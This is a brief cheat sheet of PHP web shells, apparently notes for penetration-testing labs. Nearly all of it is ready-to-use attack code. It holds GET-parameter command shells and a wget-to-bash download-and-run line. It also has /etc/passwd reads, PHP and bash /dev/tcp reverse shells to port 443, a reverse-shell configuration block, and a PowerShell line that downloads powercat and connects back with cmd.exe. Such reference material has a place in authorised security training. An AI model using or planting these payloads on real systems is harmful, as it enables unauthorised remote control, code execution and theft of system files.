# PHP Web Shells

**Basic**

```php
<?php system($_GET['cmd']);?>
```

**Command Execution**

```php
<?php system('hostname'); ?>
<?php system('ping -c1 10.10.14.12'); ?>
<?php system('wget -qO- 10.10.14.12/r | bash'); ?>
```

**File Read**

```php
<?php file_get_contents('/etc/passwd'); ?>
```

**Page Source Code Modification**

```php
system($_GET[0]);
```

**Obfuscated**

```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```

#### PHP webshell on kali by default

```
/usr/share/webshells/php/php-reverse-shell.php
```

* php reverse shell

```php
php -r '$sock=fsockopen("10.10.14.52",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**One Line**

```php
<?php passthru("/bin/bash -c 'bash -i &>/dev/tcp/10.10.14.52/443 0>&1'") ?>
```

**In Page webshell, when you can edit the source**

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.119.158';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

**Windows web shell**

* https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

**In Page webshell, when you can edit the source (windows)**

```php
exec("powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.190/powercat.ps1'); powercat -c 192.168.49.190 -p 443 -e cmd.exe");
```
